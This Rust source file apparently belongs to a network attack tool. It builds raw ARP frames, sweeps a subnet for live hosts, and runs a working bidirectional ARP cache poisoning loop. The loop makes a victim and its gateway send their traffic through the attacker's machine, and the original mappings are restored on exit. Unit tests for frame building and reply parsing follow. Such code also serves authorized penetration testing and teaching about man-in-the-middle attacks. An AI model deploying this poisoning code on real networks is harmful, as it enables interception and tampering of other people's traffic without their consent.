// arp

use anyhow::{anyhow, Result};
use pnet_datalink::{self, Channel, DataLinkReceiver, DataLinkSender};
use pnet_packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet_packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet_packet::Packet;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use crate::net::iface::{format_mac, IfaceInfo};

// "what i cannot create, i do not understand." — richard feynman

#[derive(Debug, Clone)]
pub struct Host {
    pub ip: Ipv4Addr,
    pub mac: [u8; 6],
}

const ARP_PACKET_LEN: usize = 28;
const ETH_HEADER_LEN: usize = 14;
const ETH_ARP_FRAME_LEN: usize = ETH_HEADER_LEN + ARP_PACKET_LEN;

const BROADCAST_MAC: [u8; 6] = [0xff; 6];

// build raw arp frame
pub fn build_arp_frame(
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
    sender_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    target_mac: [u8; 6],
    target_ip: Ipv4Addr,
    is_reply: bool,
) -> [u8; ETH_ARP_FRAME_LEN] {
    let mut buf = [0u8; ETH_ARP_FRAME_LEN];

    // eth header
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..]).unwrap();
        eth.set_destination(dst_mac.into());
        eth.set_source(src_mac.into());
        eth.set_ethertype(EtherTypes::Arp);
    }

    // arp payload
    {
        let mut arp = MutableArpPacket::new(&mut buf[ETH_HEADER_LEN..]).unwrap();
        arp.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(if is_reply {
            ArpOperations::Reply
        } else {
            ArpOperations::Request
        });
        arp.set_sender_hw_addr(sender_mac.into());
        arp.set_sender_proto_addr(sender_ip);
        arp.set_target_hw_addr(target_mac.into());
        arp.set_target_proto_addr(target_ip);
    }

    buf
}

// open datalink channel
pub fn open_channel(
    iface: &pnet_datalink::NetworkInterface,
) -> Result<(Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>)> {
    let config = pnet_datalink::Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };

    match pnet_datalink::channel(iface, config)? {
        Channel::Ethernet(tx, rx) => Ok((tx, rx)),
        _ => Err(anyhow!("expected ethernet channel")),
    }
}

// send frame
pub fn send_arp_frame(tx: &mut dyn DataLinkSender, frame: &[u8]) -> Result<()> {
    tx.send_to(frame, None)
        .ok_or_else(|| anyhow!("send_to returned none"))?
        .map_err(|e| anyhow!("send failed: {}", e))
}

// discover hosts
pub fn scan(
    info: &IfaceInfo,
    targets: &[Ipv4Addr],
    timeout: Duration,
    stop: Arc<AtomicBool>,
) -> Result<Vec<Host>> {
    let (mut tx, mut rx) = open_channel(&info.iface)?;
    let mut discovered: HashMap<Ipv4Addr, Host> = HashMap::new();

    for &target_ip in targets {
        if stop.load(Ordering::Relaxed) {
            break;
        }
        if target_ip == info.ip {
            continue;
        }

        let frame = build_arp_frame(
            info.mac,
            BROADCAST_MAC,
            info.mac,
            info.ip,
            [0x00; 6],
            target_ip,
            false,
        );
        send_arp_frame(tx.as_mut(), &frame)?;

        std::thread::sleep(Duration::from_millis(2));
    }

    // collect replies
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        match rx.next() {
            Ok(data) => {
                if let Some(host) = parse_arp_response(data, info) {
                    discovered.insert(host.ip, host);
                }
            }
            Err(e) => {
                if e.kind() != std::io::ErrorKind::TimedOut {
                    log::debug!("recv error during scan: {}", e);
                }
            }
        }
    }

    let mut hosts: Vec<Host> = discovered.into_values().collect();
    hosts.sort_by(|a, b| a.ip.cmp(&b.ip));
    Ok(hosts)
}

// parse arp reply
fn parse_arp_response(data: &[u8], info: &IfaceInfo) -> Option<Host> {
    let eth = EthernetPacket::new(data)?;
    if eth.get_ethertype() != EtherTypes::Arp {
        return None;
    }

    let arp = ArpPacket::new(eth.payload())?;
    if arp.get_operation() != ArpOperations::Reply {
        return None;
    }

    let sender_ip = arp.get_sender_proto_addr();
    if sender_ip == info.ip {
        return None;
    }

    let sender_mac: [u8; 6] = arp.get_sender_hw_addr().octets();

    Some(Host {
        ip: sender_ip,
        mac: sender_mac,
    })
}

// bidirectional poison: target <-> gateway
pub fn poison(
    tx: &mut dyn DataLinkSender,
    info: &IfaceInfo,
    target_ip: Ipv4Addr,
    target_mac: [u8; 6],
    gateway_ip: Ipv4Addr,
    gateway_mac: [u8; 6],
) -> Result<()> {
    // tell target: we are gateway
    let frame_to_target = build_arp_frame(
        info.mac,
        target_mac,
        info.mac,
        gateway_ip,
        target_mac,
        target_ip,
        true,
    );
    send_arp_frame(tx, &frame_to_target)?;

    // tell gateway: we are target
    let frame_to_gateway = build_arp_frame(
        info.mac,
        gateway_mac,
        info.mac,
        target_ip,
        gateway_mac,
        gateway_ip,
        true,
    );
    send_arp_frame(tx, &frame_to_gateway)?;

    log::debug!(
        "poisoned {} <-> {} (via {})",
        target_ip,
        gateway_ip,
        format_mac(&info.mac)
    );

    Ok(())
}

// restore real arp mappings
pub fn restore(
    tx: &mut dyn DataLinkSender,
    target_ip: Ipv4Addr,
    target_mac: [u8; 6],
    gateway_ip: Ipv4Addr,
    gateway_mac: [u8; 6],
    count: usize,
) -> Result<()> {
    for _ in 0..count {
        let frame_to_target = build_arp_frame(
            gateway_mac,
            target_mac,
            gateway_mac,
            gateway_ip,
            target_mac,
            target_ip,
            true,
        );
        send_arp_frame(tx, &frame_to_target)?;

        let frame_to_gateway = build_arp_frame(
            target_mac,
            gateway_mac,
            target_mac,
            target_ip,
            gateway_mac,
            gateway_ip,
            true,
        );
        send_arp_frame(tx, &frame_to_gateway)?;

        std::thread::sleep(Duration::from_millis(50));
    }

    log::info!("restored arp for {} <-> {}", target_ip, gateway_ip);
    Ok(())
}

// poison loop until stopped
pub fn poison_loop(
    info: &IfaceInfo,
    target_ip: Ipv4Addr,
    target_mac: [u8; 6],
    gateway_ip: Ipv4Addr,
    gateway_mac: [u8; 6],
    interval: Duration,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let (mut tx, _rx) = open_channel(&info.iface)?;

    while !stop.load(Ordering::Relaxed) {
        poison(
            tx.as_mut(),
            info,
            target_ip,
            target_mac,
            gateway_ip,
            gateway_mac,
        )?;
        std::thread::sleep(interval);
    }

    // restore on exit
    restore(
        tx.as_mut(),
        target_ip,
        target_mac,
        gateway_ip,
        gateway_mac,
        5,
    )?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_arp_request_frame() {
        let src_mac = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff];
        let frame = build_arp_frame(
            src_mac,
            BROADCAST_MAC,
            src_mac,
            Ipv4Addr::new(192, 168, 1, 100),
            [0x00; 6],
            Ipv4Addr::new(192, 168, 1, 1),
            false,
        );

        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_destination().octets(), BROADCAST_MAC);
        assert_eq!(eth.get_source().octets(), src_mac);
        assert_eq!(eth.get_ethertype(), EtherTypes::Arp);

        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_operation(), ArpOperations::Request);
        assert_eq!(arp.get_sender_hw_addr().octets(), src_mac);
        assert_eq!(
            arp.get_sender_proto_addr(),
            Ipv4Addr::new(192, 168, 1, 100)
        );
        assert_eq!(arp.get_target_proto_addr(), Ipv4Addr::new(192, 168, 1, 1));
    }

    #[test]
    fn test_build_arp_reply_frame() {
        let src = [0x11; 6];
        let dst = [0x22; 6];
        let frame = build_arp_frame(
            src,
            dst,
            src,
            Ipv4Addr::new(10, 0, 0, 1),
            dst,
            Ipv4Addr::new(10, 0, 0, 2),
            true,
        );

        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_operation(), ArpOperations::Reply);
        assert_eq!(arp.get_sender_hw_addr().octets(), src);
        assert_eq!(arp.get_target_hw_addr().octets(), dst);
    }

    #[test]
    fn test_frame_length() {
        let frame = build_arp_frame(
            [0; 6],
            [0xff; 6],
            [0; 6],
            Ipv4Addr::new(0, 0, 0, 0),
            [0; 6],
            Ipv4Addr::new(0, 0, 0, 0),
            false,
        );
        assert_eq!(frame.len(), 42); // 14 eth + 28 arp
    }

    #[test]
    fn test_parse_arp_response_valid() {
        let src_mac = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
        let our_mac = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff];
        let frame = build_arp_frame(
            src_mac,
            our_mac,
            src_mac,
            Ipv4Addr::new(192, 168, 1, 50),
            our_mac,
            Ipv4Addr::new(192, 168, 1, 100),
            true,
        );

        let info = IfaceInfo {
            name: "eth0".into(),
            mac: our_mac,
            ip: Ipv4Addr::new(192, 168, 1, 100),
            netmask: Ipv4Addr::new(255, 255, 255, 0),
            gateway_ip: Ipv4Addr::new(192, 168, 1, 1),
            gateway_mac: None,
            iface: pnet_datalink::interfaces()[0].clone(),
        };

        let host = parse_arp_response(&frame, &info).unwrap();
        assert_eq!(host.ip, Ipv4Addr::new(192, 168, 1, 50));
        assert_eq!(host.mac, src_mac);
    }

    #[test]
    fn test_parse_arp_response_ignores_own() {
        let our_mac = [0xaa; 6];
        let frame = build_arp_frame(
            our_mac,
            [0xff; 6],
            our_mac,
            Ipv4Addr::new(192, 168, 1, 100),
            [0; 6],
            Ipv4Addr::new(192, 168, 1, 1),
            true,
        );

        let info = IfaceInfo {
            name: "eth0".into(),
            mac: our_mac,
            ip: Ipv4Addr::new(192, 168, 1, 100),
            netmask: Ipv4Addr::new(255, 255, 255, 0),
            gateway_ip: Ipv4Addr::new(192, 168, 1, 1),
            gateway_mac: None,
            iface: pnet_datalink::interfaces()[0].clone(),
        };

        assert!(parse_arp_response(&frame, &info).is_none());
    }

    #[test]
    fn test_parse_arp_response_ignores_request() {
        let src_mac = [0x11; 6];
        let our_mac = [0xaa; 6];
        let frame = build_arp_frame(
            src_mac,
            BROADCAST_MAC,
            src_mac,
            Ipv4Addr::new(192, 168, 1, 50),
            [0; 6],
            Ipv4Addr::new(192, 168, 1, 1),
            false,
        );

        let info = IfaceInfo {
            name: "eth0".into(),
            mac: our_mac,
            ip: Ipv4Addr::new(192, 168, 1, 100),
            netmask: Ipv4Addr::new(255, 255, 255, 0),
            gateway_ip: Ipv4Addr::new(192, 168, 1, 1),
            gateway_mac: None,
            iface: pnet_datalink::interfaces()[0].clone(),
        };

        assert!(parse_arp_response(&frame, &info).is_none());
    }
}
